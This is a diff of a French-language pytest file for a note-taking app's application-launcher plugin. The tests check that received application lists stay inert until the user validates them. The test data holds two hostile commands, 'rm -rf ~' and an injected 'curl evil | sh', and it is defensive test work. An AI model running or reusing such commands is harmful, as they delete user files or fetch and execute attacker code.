@@ -161,18 +161,134 @@ def test_selection_manquante_et_fiche_verrouillee_refusees(fen, lances):
     assert lances == [["thunderbird"]]
 
 
-def test_liste_enregistree_remplace_les_exemples(fen):
+def _modules():
+    return sys.modules["scrinium_plugin_applications"]
+
+
+def _fiche_apps(fen, texte, titre="Applications", theme="Outils"):
+    """Fiche « applications » arrivée sans passer par la vue (comme un partage ou un dépôt) : jamais validée."""
+    return plugin(fen).ctx.creer_fiche(theme, titre, texte)
+
+
+def _noms(p):
+    return [p.panneau.liste.item(i).text() for i in range(p.panneau.liste.count())]
+
+
+def test_reglages_d_avant_servent_tant_qu_il_n_y_a_pas_de_fiche(fen):
     p = plugin(fen)
-    p.sauver([{"nom": "Seule", "commande": "seule"}])
-    assert [a["nom"] for a in p.applications()] == ["Seule"] and p.panneau.liste.count() == 1
-    p.sauver([])
+    p.ctx.reglages.set("applications", [{"nom": "Seule", "commande": "seule"}])
+    p.panneau.rafraichir()
+    assert [a["nom"] for a in p.applications()] == ["Seule"] and _noms(p) == ["Seule"]
+    p.ctx.reglages.set("applications", [])
+    p.panneau.rafraichir()
     assert p.applications() == [] and p.panneau.liste.count() == 0                  # une liste vide reste vide
+
+
+def test_fiche_recue_inerte_puis_validee(fen, lances):
+    p = plugin(fen)
+    v = _fiche_apps(fen, lg.en_texte([{"nom": "Piege", "commande": "rm -rf ~"}, {"nom": "Ok", "commande": "ok"}]))
+    assert not p.ctx.fiche_active(v) and p.a_valider() == 1
+    assert "Piege" not in _noms(p) and not p.panneau.avis.isHidden()                 # inerte : rien dans le panneau, un avis
+    assert _noms(p) == ["Thunderbird", "KWrite"]                                      # le panneau garde l'ancienne liste
+    th = fen.store.theme("Outils")
+    fen._afficher(th, th.fiches[0])                                                   # la fiche s'affiche avec sa vue et le bandeau
+    vue = fen.vues_types["applications"]
+    assert fen.pile.currentWidget() is vue and not fen.bandeau_validation.isHidden() and vue.actif is False
+    assert [a["nom"] for a in vue.apps] == ["Piege", "Ok"] and not vue.boutons[0].isEnabled()      # lisible, pas modifiable
+    fen.valider_fiche_courante()                                                      # l'utilisateur relit et valide
+    assert p.ctx.fiche_active(v) and p.a_valider() == 0 and p.panneau.avis.isHidden()
+    assert _noms(p) == ["Piege", "Ok"] and vue.actif and vue.boutons[0].isEnabled()
+
+
+def test_la_fiche_modifiee_ailleurs_redevient_inerte(fen, lances):
+    p = plugin(fen)
+    v = _fiche_apps(fen, lg.en_texte([{"nom": "Ok", "commande": "ok"}]))
+    th = fen.store.theme("Outils")
+    f = th.fiches[0]
+    fen.store.valider_fiche(th, f)
+    p.panneau.rafraichir()
+    assert _noms(p) == ["Ok"]
+    item = p.panneau.liste.item(0)
+    fen.store.enregistrer(th, f, f.titre, lg.en_texte([{"nom": "Ok", "commande": "ok ; curl evil | sh"}]))     # mise à jour reçue d'ailleurs
+    p.panneau._clic(item)                                                             # clic sur l'icône affichée avant : rien ne part
+    assert lances == [] and p.a_valider() == 1 and _noms(p) == ["Thunderbird", "KWrite"]
+
+
+def test_texte_ecrit_dans_la_vue_est_valide(fen):
+    p = plugin(fen)
+    _fiche_apps(fen, lg.en_texte([{"nom": "Ok", "commande": "ok"}]))
+    th = fen.store.theme("Outils")
+    fen._afficher(th, th.fiches[0])
+    fen.valider_fiche_courante()
+    fen.vues_types["applications"].apps.append({"nom": "Neuve", "icone": "", "commande": "neuve", "description": ""})
+    fen.vues_types["applications"]._enregistrer()                                    # modification faite dans la vue : validée une fois sauvée
+    fen.sauver()
+    assert "neuve" in th.fiches[0].texte and fen.store.fiche_validee(th, th.fiches[0]) and _noms(p) == ["Ok", "Neuve"]
+
+
+def test_deux_fiches_validees_s_additionnent_sans_doublon(fen):
+    p = plugin(fen)
+    _fiche_apps(fen, lg.en_texte([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}]), titre="Un")
+    _fiche_apps(fen, lg.en_texte([{"nom": "B", "commande": "b"}, {"nom": "C", "commande": "c"}]), titre="Deux")
+    th = fen.store.theme("Outils")
+    for f in th.fiches:
+        fen.store.valider_fiche(th, f)
+    p.panneau.rafraichir()
+    assert _noms(p) == ["B", "C", "A"]                                                  # par titre de fiche (Deux, Un), sans doublon
+
+
+def test_migration_des_reglages_en_fiche(fen):
+    p = plugin(fen)
+    notes = []
+    p.ctx.ui.notifier = lambda t, m: notes.append(m)
+    p.ctx.reglages.set("applications", [{"nom": "Ancienne", "commande": "ancienne"}])
+    p.ctx.reglages.set("migrees", False)
+    p._migrer()
+    th = fen.store.theme("Outils")
+    assert th is not None and len(th.fiches) == 1 and th.fiches[0].titre == "Applications"
+    assert [a["nom"] for a in lg.depuis_texte(th.fiches[0].texte)] == ["Ancienne"]
+    assert not fen.store.fiche_validee(th, th.fiches[0]) and "validez-la" in notes[-1]     # créée inerte : à valider
+    assert [a["nom"] for a in p.ctx.reglages.get("applications")] == ["Ancienne"]          # les réglages restent comme copie
+    assert _noms(p) == ["Ancienne"]                                                        # le panneau continue avec l'ancienne liste
+    p._migrer()                                                                           # une seule fois
+    assert len(th.fiches) == 1
+
+
+def test_modifier_cree_la_fiche_puis_la_rouvre(fen):
+    p = plugin(fen)
+    p.ctx.reglages.set("migrees", True)
+    p.modifier()
+    th = fen.store.theme("Outils")
+    assert len(th.fiches) == 1 and fen.fiche is th.fiches[0] and fen.pile.currentWidget() is fen.vues_types["applications"]
+    p.modifier()
+    assert len(th.fiches) == 1                                                            # pas de seconde fiche
+
+
+def test_desactiver_retire_le_type(fen):
+    from scrinium.core import types_fiche
+    assert types_fiche.type_de("#scrinium-applications\n") is not None and "applications" in fen.vues_types
+    fen.plugins.desactiver("applications")
+    assert types_fiche.type_de("#scrinium-applications\n") is None and "applications" not in fen.vues_types
+
+
+def test_format_de_la_fiche_applications():
+    liste = [{"nom": "Thunderbird", "icone": "thunderbird", "commande": "thunderbird", "description": "Courrier."},
+             {"nom": "Sans icône", "icone": "", "commande": "x --opt: a", "description": ""}]
+    texte = lg.en_texte(liste)
+    assert texte.startswith("#scrinium-applications\n") and lg.depuis_texte(texte) == lg.normaliser_liste(liste)
+    assert lg.depuis_texte("#scrinium-applications\nnotes libres\n## A\ncommande: a\nmystere: z\n## SansCommande\nicone: i\n") == \
+        [{"nom": "A", "icone": "", "commande": "a", "description": ""}]
+    assert lg.depuis_texte("") == [] and lg.depuis_texte(None) == [] and lg.depuis_texte("texte libre") == []
+    beaucoup = lg.en_texte([{"nom": f"a{i}", "commande": f"c{i}"} for i in range(150)])
+    assert len(lg.depuis_texte(beaucoup)) == lg.MAX_APPLICATIONS
+    assert lg.TYPE.nom == "applications" and lg.TYPE.executable and lg.TYPE.marque == lg.MARQUE
 
 
 def test_dialogues_se_construisent(fen):
     m = sys.modules["scrinium_plugin_applications"]
     p = plugin(fen)
-    d = m.DialogueApplications(p)
+    d = m.EditeurApplications()
+    d.definir(p.applications())
     assert d.liste.count() == 2
     ch = m.DialogueChoix(None, apps=[{"nom": "Alpha", "icone": "", "commande": "alpha", "description": ""},
                                      {"nom": "Beta", "icone": "", "commande": "beta", "description": ""}])
